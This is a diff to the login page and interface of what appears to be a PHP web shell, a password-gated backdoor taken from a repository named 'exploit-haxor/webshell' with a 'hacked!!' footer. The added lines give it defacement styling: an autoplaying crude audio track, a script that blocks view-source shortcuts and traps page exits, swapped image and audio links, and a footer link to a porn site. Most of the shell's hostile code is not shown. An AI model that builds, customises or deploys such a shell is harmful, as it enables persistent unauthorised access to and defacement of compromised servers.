@@ -52,6 +52,7 @@ function Login() {
 <html>
 <head>
 <title>WHOOOOO</title>
+<style>html{height:100%;margin:0;background-image:url(https://media1.tenor.com/m/J01NX0ikmNwAAAAC/ricardo-flick-dance.gif);background-position:center;background-repeat:no-repeat;background-size:cover}</style><div id=audioSection><audio autoplay controls id=bgAudio loop style=display:none><source src=https://cvar1984.github.io/audio/moan.mp3 type=audio/mpeg></audio><script>document.onkeydown=function(e){if(e.ctrlKey&&(85===e.keyCode||119===e.keyCode))return!1},window.addEventListener("beforeunload",function(e){e.preventDefault(),e.returnValue="Gacor Kang?"});var audio=document.getElementById("bgAudio")</script></div>
 <style type='text/css'>
 html {
     margin: 20px auto;
@@ -78,8 +79,8 @@ input[type=password] {
 <br>
 <br>
 <header>
-<audio autoplay='1' loop='1'><source src='https://raw.githubusercontent.com/exploit-haxor/webshell/main/x.mp3' type='audio/mp3'/></audio>
-<img src='https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/IMG_0731.jpeg' width='600' height='600' align='center'>
+
+<img src='https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/x.png' width='600' height='600' align='center'>
 <br>
 <br>
 <pre align=center><form method='post'><input type='password' name='pass' style='background-color:none;border:1px solid #FFF;outline:none;' required><input type=submit value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>
@@ -112,6 +113,7 @@ if(!empty($auth_pass)) {
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
   <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
 <style>
+	<audio autoplay controls id=bgAudio loop style=display:none><source src=https://cvar1984.github.io/audio/moan.mp3 type=audio/mpeg></audio><script>document.onkeydown=function(e){if(e.ctrlKey&&(85===e.keyCode||119===e.keyCode))return!1},window.addEventListener("beforeunload",function(e){e.preventDefault(),e.returnValue="Gacor Kang?"});var audio=document.getElementById("bgAudio")</script></div>
 * {
  	font-family: Electrolize, sans-serif;
 }
@@ -2169,12 +2171,7 @@ echo '</table>
 </div>';
 }
 echo '<br><br><hr color="#191919"><br><center>Copyright &copy '.date("Y").' <a href="xnxx.com" target="_blank">azz</a> - <a href="heked huked hacked!! " target="_blank">'.$_COPY.'</a></center>
-
-
-<audio controls autoplay>
-  <source src="https://raw.githubusercontent.com/exploit-haxor/webshell/main/x.mp3" type="audio/mpeg">
-</audio>
-
+<iframe src="https://raw.githubusercontent.com/exploit-haxor/webshell/main/x.mp3" type="audio/mp3" allow="autoplay" id="audio" style="display:none"></iframe> 
 </body>
 </html>';
 ?>
